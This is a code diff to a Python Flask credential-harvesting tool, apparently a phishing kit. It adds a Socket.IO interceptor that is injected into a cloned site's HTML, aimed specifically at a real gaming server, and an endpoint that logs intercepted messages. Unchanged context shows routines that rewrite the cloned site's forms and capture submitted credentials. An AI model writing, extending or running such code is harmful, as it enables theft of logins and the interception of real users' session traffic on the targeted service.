@@ -7,6 +7,7 @@ import json
 import threading
 from bs4 import BeautifulSoup
 from .websocket_interceptor import WebSocketInterceptor, inject_websocket_interceptor
+from .socketio_interceptor import SocketIOInterceptor, inject_socketio_interceptor
 
 logger = logging.getLogger(__name__)
 
@@ -29,13 +30,21 @@ class IntegratedHarvester:
         
         # Setup WebSocket interceptor if enabled
         if self.capture_websocket and self.ws_url:
-            self.ws_interceptor = WebSocketInterceptor(
-                output_file=str(self.output_file.parent / "websocket_capture.json")
-            )
-            # Inject WebSocket interceptor into HTML
-            inject_websocket_interceptor(str(self.site_dir), self.ws_url)
-            # Setup WebSocket proxy route
-            self.ws_interceptor.setup_websocket_proxy(self.app, self.ws_url)
+            # Use Socket.IO interceptor for pakamia gameserver
+            if 'gameserver.pakamia.ke' in self.ws_url or 'socket.io' in self.ws_url:
+                self.socketio_interceptor = SocketIOInterceptor(
+                    output_file=str(self.output_file.parent / "socketio_capture.json")
+                )
+                # Inject Socket.IO interceptor into HTML
+                inject_socketio_interceptor(str(self.site_dir))
+            else:
+                self.ws_interceptor = WebSocketInterceptor(
+                    output_file=str(self.output_file.parent / "websocket_capture.json")
+                )
+                # Inject WebSocket interceptor into HTML
+                inject_websocket_interceptor(str(self.site_dir), self.ws_url)
+                # Setup WebSocket proxy route
+                self.ws_interceptor.setup_websocket_proxy(self.app, self.ws_url)
         
         # Modify forms on startup
         self._modify_all_forms()
@@ -62,6 +71,22 @@ class IntegratedHarvester:
             if request.method in ['POST', 'PUT', 'PATCH']:
                 return self._capture_credentials(f'api/{path}')
             return json.dumps({"success": True}), 200, {'Content-Type': 'application/json'}
+        
+        @self.app.route('/capture-socketio', methods=['POST'])
+        def capture_socketio():
+            """Capture Socket.IO messages from JavaScript"""
+            try:
+                data = request.get_json()
+                if hasattr(self, 'socketio_interceptor'):
+                    self.socketio_interceptor.log_message(
+                        data.get('event', 'unknown'),
+                        data.get('data', {}),
+                        data.get('direction', 'unknown')
+                    )
+                return json.dumps({"success": True}), 200, {'Content-Type': 'application/json'}
+            except Exception as e:
+                logger.error(f"Socket.IO capture failed: {e}")
+                return json.dumps({"success": False}), 500, {'Content-Type': 'application/json'}
         
         @self.app.route('/captured', methods=['GET'])
         def show_captured():
